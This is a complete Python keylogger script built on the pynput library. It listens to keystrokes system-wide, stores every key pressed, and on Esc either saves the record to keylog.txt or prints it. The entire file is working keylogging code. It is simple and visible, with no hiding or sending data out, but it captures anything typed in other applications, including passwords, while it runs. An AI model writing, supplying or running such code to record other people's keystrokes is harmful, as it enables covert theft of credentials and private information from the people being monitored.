#pynput must be install in the terminal before usage. "pip install pynput"

import sys
import pynput
from pynput import keyboard

keysPressed = []

def pushedDown(key):
    if key == keyboard.Key.esc:
        print("Keylogger off")
        question = input("Would you like to export [E] this to a .txt file or print [P] to console?: ")
        if question == "e" or question == "E":
            with open("keylog.txt", "w") as file:
                file.write("Keys pressed: " + str(keysPressed))
            sys.exit()
        elif question == "p" or question == "P":
            print("Keys pressed:", keysPressed)
            sys.exit()
        else:
            print("Invalid")
            sys.exit()
    else:
        try:
            keysPressed.append(key.char)
        except AttributeError:
            keysPressed.append(f"[{key}]")

with keyboard.Listener(on_press=pushedDown) as keyListener:
    keyListener.join()
